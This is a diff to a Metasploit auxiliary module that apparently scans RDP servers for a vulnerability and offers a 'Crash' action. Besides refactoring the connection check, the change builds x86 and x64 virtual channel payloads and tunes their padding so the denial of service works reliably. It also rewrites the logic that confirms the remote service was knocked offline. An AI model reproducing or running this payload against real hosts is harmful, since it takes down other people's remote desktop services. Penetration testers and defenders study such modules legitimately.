@@ -82,15 +82,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def rdp_reachable
-    begin
-      connect
-      disconnect
-      return true
-    rescue Rex::ConnectionRefused
-      return false
-    rescue Rex::ConnectionTimeout
-      return false
-    end
+    connect
+    disconnect
+    return true
+  rescue Rex::ConnectionRefused
+    return false
+  rescue Rex::ConnectionTimeout
+    return false
   end
 
   def check_host(ip)
@@ -211,20 +209,23 @@ class MetasploitModule < Msf::Auxiliary
     # The arch governs which of the packets triggers the desired response
     # which is an MCS Disconnect Provider Ultimatum or a timeout.
 
-    # 0x03 = CHANNEL_FLAG_FIRST | CHANNEL_FLAG_LAST
     x86_string = "00000000020000000000000000000000"
-    x86_string += "FF" * 8 if action.name == 'Crash'
-    x86_payload = build_virtual_channel_pdu(0x03, [x86_string].pack("H*"))
-
     x64_string = "0000000000000000020000000000000000000000000000000000000000000000"
-    x64_string += "FF" * 8 if action.name == 'Crash'
-    x64_payload = build_virtual_channel_pdu(0x03, [x64_string].pack("H*"))
 
     if action.name == 'Crash'
       vprint_status("Sending denial of service payloads")
+      # Length and chars are arbitrary but total length needs to be longer than
+      # 16 for x86 and 32 for x64. Making the payload too long seems to cause
+      # the DoS to fail.
+      x86_string += "FF" * 1
+      x64_string += "FF" * 2
     else
       vprint_status("Sending patch check payloads")
     end
+
+    # 0x03 = CHANNEL_FLAG_FIRST | CHANNEL_FLAG_LAST
+    x86_payload = build_virtual_channel_pdu(0x03, [x86_string].pack("H*"))
+    x64_payload = build_virtual_channel_pdu(0x03, [x64_string].pack("H*"))
 
     for j in 0..5
 
@@ -236,16 +237,16 @@ class MetasploitModule < Msf::Auxiliary
 
       # A single pass should be sufficient to cause DoS
       if action.name == 'Crash'
-        # Sleeping a second before disconnect makes this much more reliable
         sleep(1)
         disconnect
+
         sleep(1)
-        if !rdp_reachable
-          print_good("Target service appears to have been successfully crashed.")
-          return Exploit::CheckCode::Vulnerable
-        else
+        if rdp_reachable
           print_error("Target doesn't appear to have been crashed.")
           return Exploit::CheckCode::Unknown
+        else
+          print_good("Target service appears to have been successfully crashed.")
+          return Exploit::CheckCode::Vulnerable
         end
       end
 
